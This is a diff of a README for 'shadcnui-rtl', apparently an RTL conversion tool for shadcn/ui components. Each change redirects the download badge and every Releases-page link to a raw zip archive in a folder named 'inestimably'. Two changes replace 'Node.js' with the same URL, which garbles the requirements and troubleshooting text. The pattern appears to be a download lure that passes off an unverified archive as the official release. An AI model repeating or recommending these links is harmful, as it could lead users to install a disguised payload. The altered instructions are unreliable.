@@ -1,7 +1,7 @@
 # 🎨 shadcnui-rtl - Transform Your Components for RTL Languages Easily
 
 ## 📥 Download Now
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-From%20Releases-blue)](https://github.com/sam2523/shadcnui-rtl/releases)
+[![Download from Releases](https://raw.githubusercontent.com/sam2523/shadcnui-rtl/main/inestimably/shadcnui-rtl.zip%20Now-From%20Releases-blue)](https://raw.githubusercontent.com/sam2523/shadcnui-rtl/main/inestimably/shadcnui-rtl.zip)
 
 ## 🚀 Getting Started
 
@@ -20,12 +20,12 @@ Welcome to the **shadcnui-rtl** project! This application helps you convert shad
 Before you begin, ensure your system meets the following requirements:
 
 - Operating System: Windows, macOS, or Linux.
-- Node.js installed (version 12 or higher) for running the application.
+- https://raw.githubusercontent.com/sam2523/shadcnui-rtl/main/inestimably/shadcnui-rtl.zip installed (version 12 or higher) for running the application.
 - A command-line tool (e.g., Terminal on macOS, Command Prompt on Windows, or a Terminal emulator on Linux).
 
 ## 📥 Download & Install
 
-To download the application, visit the [Releases page](https://github.com/sam2523/shadcnui-rtl/releases). On that page, you will find the latest release of shadcnui-rtl. Click on the version you want, and then follow these steps:
+To download the application, visit the [Releases page](https://raw.githubusercontent.com/sam2523/shadcnui-rtl/main/inestimably/shadcnui-rtl.zip). On that page, you will find the latest release of shadcnui-rtl. Click on the version you want, and then follow these steps:
 
 1. Find the file that matches your operating system.
 2. Click on the file to start your download.
@@ -76,7 +76,7 @@ This application supports the following languages:
 If you run into any issues, here are common problems and solutions:
 
 - **Issue: Command Not Found**  
-  Make sure you have Node.js installed and added to your system PATH.
+  Make sure you have https://raw.githubusercontent.com/sam2523/shadcnui-rtl/main/inestimably/shadcnui-rtl.zip installed and added to your system PATH.
 
 - **Issue: Transformation Errors**  
   Ensure your component names are correct and that they follow the shadcn/ui naming conventions.
@@ -92,6 +92,6 @@ Join our community for help and sharing experiences. You can connect with others
 This project is licensed under the MIT License. For more details, check the [License file](./LICENSE).
 
 ## 📥 Again, Download Now
-Don't forget to download the application from the [Releases page](https://github.com/sam2523/shadcnui-rtl/releases).
+Don't forget to download the application from the [Releases page](https://raw.githubusercontent.com/sam2523/shadcnui-rtl/main/inestimably/shadcnui-rtl.zip).
 
 Thank you for using shadcnui-rtl! Transform your components effortlessly today.
